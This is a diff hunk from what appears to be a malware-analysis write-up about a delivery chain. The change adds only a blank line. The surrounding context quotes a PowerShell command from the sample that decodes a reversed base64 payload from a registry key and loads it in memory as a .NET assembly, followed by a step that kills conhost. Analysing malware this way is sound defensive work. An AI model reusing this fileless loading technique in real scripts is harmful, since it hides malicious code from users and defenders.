@@ -116,6 +116,7 @@ Read the value from registry subkey "v" (created by VBS script), passes to the p
 ```ps
 {[}AppDomain{]}::CurrentDomain.Load{(}[Convert{]}::FromBase64String{(}{(}-join {(}Get-ItemProperty -LiteralPath 'HKCU:\Software\650594173' -Name 's'{)}.s | ForEach-Object {{}$_{[}-1..-{(}$_.Length{)}{]}{}}{)}{)}{)}; {[}a.a{]}::a{(}'650594173'{)}".
 ``` 
+
 After that, the string "Stop-Process -Name conhost -Force" is passed to the powershell process and enters. 
 ![ss16](/assets/images/delivery_async/ss16.png)
 
